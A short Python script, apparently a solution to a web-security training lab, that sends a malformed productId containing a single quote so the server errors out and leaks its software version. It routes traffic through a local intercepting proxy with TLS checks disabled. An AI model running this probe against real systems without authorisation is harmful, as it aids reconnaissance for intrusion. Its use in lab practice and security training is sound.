import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_version_number(url, session):
    product_url = url + "/product?productId='"
    response = session.get(
        product_url,
        verify=False,
        proxies=proxies)
    if (response.status_code == 500):
        return response.text
    raise ValueError("Could not exploit vulnerabilty.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Information Disclosure attack...")
        version_number = get_version_number(url, session)
        print("[+] The version number is '%s'" % version_number)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Information Disclosure attack was not successful.")
        sys.exit(FAIL) 